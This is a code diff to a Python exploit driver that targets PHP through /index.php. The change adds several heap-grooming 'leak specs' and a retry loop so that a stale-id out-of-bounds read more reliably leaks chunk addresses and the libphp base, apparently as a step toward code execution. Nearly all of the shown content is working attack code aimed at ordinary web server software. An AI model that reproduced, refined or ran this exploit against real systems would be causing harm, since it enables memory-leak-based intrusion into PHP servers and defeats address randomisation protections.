@@ -45,7 +45,17 @@ HERE = os.path.dirname(os.path.abspath(__file__))
 R = HERE
 PURE = os.path.join(HERE, "pure")
 Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
-LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
+LEAK_SPECS = [
+    # calibrated original: hole at field 14  (G:400 → 111-page gap)
+    ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"]),
+    # minimal fill: 197 free pages per chunk (distributes HashTables widely)
+    ",".join(["G:315:0x137"] * 16 + ["X:900"]),
+    # two holes at fields 5 and 11  (G:400 each → two 111-page gaps)
+    ",".join(["G:511:0x137"] * 5 + ["G:400:0x137"] + ["G:511:0x137"] * 5 +
+             ["G:400:0x137"] + ["G:511:0x137"] * 4 + ["X:900"]),
+    # wider hole at field 3  (G:300 → 211-page gap)
+    ",".join(["G:511:0x137"] * 3 + ["G:300:0x137"] + ["G:511:0x137"] * 12 + ["X:900"]),
+]
 # pointers-to-main-chunk fingerprint in the LEAK_SPEC window (stable count)
 MAIN_BUCKET_COUNT = 87
 PROFILES = {
@@ -260,31 +270,44 @@ def _run_attempt(args, holders, profile, attempt, tmp) -> int:
     time.sleep(0.2)
 
     print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
-    b1 = os.path.join(tmp, "b1.bin")
-    subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"),
-                    "--out", b1, "--spec", LEAK_SPEC,
-                    "--fake-len", "0xC8000", "--tag"], check=True,
-                   stdout=subprocess.DEVNULL)
-    leak_file = os.path.join(tmp, "leak.resp")
-    try:
-        resp = send_chunked(args.host, args.port, "/index.php", b1, args.timeout, leak_file)
-        info = parse_leak(resp, profile)
-    except Exception as exc:
-        print("      leak failed: %r" % (exc,))
-        raise _AttemptFailed()
-    print("      arch=%s decoded=%d zval_ptr_dtor=%#x -> libphp=%#x" % (
-        info["arch"], info["decoded"], info["zdtor"], info["lib"]))
-    print("      chunk buckets: %s" % [(hex(b), c) for b, c in
-                                       info["buckets"].most_common(6)])
-    if not info["main_candidates"]:
-        print("      no main-chunk candidate")
+    info = None
+    for si, spec in enumerate(LEAK_SPECS):
+        b1 = os.path.join(tmp, "b1_%d.bin" % si)
+        subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"),
+                        "--out", b1, "--spec", spec,
+                        "--fake-len", "0xC8000", "--tag"], check=True,
+                       stdout=subprocess.DEVNULL)
+        leak_file = os.path.join(tmp, "leak_%d.resp" % si)
+        try:
+            resp = send_chunked(args.host, args.port, "/index.php", b1,
+                                args.timeout, leak_file)
+            leak_info = parse_leak(resp, profile)
+        except Exception as exc:
+            print("      spec %d/%d miss: %r" % (si + 1, len(LEAK_SPECS), exc))
+            continue
+        cand = leak_info["main_candidates"]
+        if not cand:
+            print("      spec %d/%d miss: no main-chunk candidate" % (
+                si + 1, len(LEAK_SPECS)))
+            continue
+        delta = leak_info["lib"] - cand[0]
+        prof = leak_info["profile"]
+        if not (prof["delta_min"] <= delta <= prof["delta_max"]):
+            print("      spec %d/%d miss: implausible delta %#x" % (
+                si + 1, len(LEAK_SPECS), delta))
+            continue
+        info = leak_info
+        print("      spec %d/%d hit: decoded=%d zdtor=%#x libphp=%#x" % (
+            si + 1, len(LEAK_SPECS), info["decoded"], info["zdtor"], info["lib"]))
+        print("      chunk buckets: %s" % [(hex(b), c) for b, c in
+                                           info["buckets"].most_common(6)])
+        break
+
+    if info is None:
+        print("      all %d B1 specs failed" % len(LEAK_SPECS))
         raise _AttemptFailed()
     main = info["main_candidates"][0]
-    delta = info["lib"] - main
     prof = info["profile"]
-    if not (prof["delta_min"] <= delta <= prof["delta_max"]):
-        print("      implausible libphp-main delta %#x; re-leak" % delta)
-        raise _AttemptFailed()
 
     zif = info["lib"] + prof["zif_offset"]
     for cand in info["main_candidates"]:
